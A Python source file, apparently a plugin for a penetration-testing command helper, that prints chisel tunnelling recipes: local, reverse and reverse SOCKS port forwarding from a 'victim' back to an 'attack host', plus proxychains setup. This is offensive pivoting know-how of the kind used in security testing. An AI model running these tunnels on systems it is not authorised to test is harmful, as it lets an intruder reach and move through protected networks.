from command.Command import Command

class CommandChisel(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        self.lhost = config['defaults']['lhost']
        self.defaultServerPort = config['commands']['chisel']['serverPort']
        self.defaultSocksPort = config['commands']['chisel']['socksPort']


    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['chisel']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'chisel'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        commands = []
        commands.append('# Local port forwarding')
        commands.append('## Start server on remote host (victim):')
        commands.append(f'chisel server -p {self.defaultServerPort}')
        commands.append('## Connect from client (attack host):')
        commands.append(f'chisel client {self.lhost}:{self.defaultServerPort} [<local-ip>:]<local-port>:<remote-ip>:<remote-port>')
        commands.append('## Result: <remote-ip>:<remote-port> can be accessed at [<local-ip>:]<local-port> on client (attack host)')
        commands.append('')
        commands.append('# Reverse port forwarding')
        commands.append('## Start server (on attack host):')
        commands.append(f'chisel server -p {self.defaultServerPort} --reverse')
        commands.append('## Connect from client (victim):')
        commands.append(f'chisel client {self.lhost}:{self.defaultServerPort} R:[<local-ip>:]<local-port>:<remote-ip>:<remote-port>')
        commands.append('## Result: <remote-ip>:<remote-port> is available at [<local-ip>:]<local-port> on server (attack host)')
        commands.append('')
        commands.append('# Reverse dynamic port forwarding (SOCKS proxy)')
        commands.append('## Start server (on attack host):')
        commands.append(f'chisel server -p {self.defaultServerPort} --reverse')
        commands.append('## Connect from client (victim):')
        commands.append(f'chisel client {self.lhost}:{self.defaultServerPort} R:{self.defaultSocksPort}:socks')
        commands.append('## Configure proxychains (e.g. in /etc/proxychains.conf):')
        commands.append(f'socks5 127.0.0.1 {self.defaultSocksPort}')
        commands.append(f'## Use with proxychains')
        commands.append(f'proxychains <regular-command>')
        commands.append('')
        commands.append('# Misc')
        commands.append('## Use UDP for tunnelling: simpy add /udp at end of client connect string')
        commands.append(f'chisel client {self.lhost}:{self.defaultServerPort}/udp ...')
        return commands
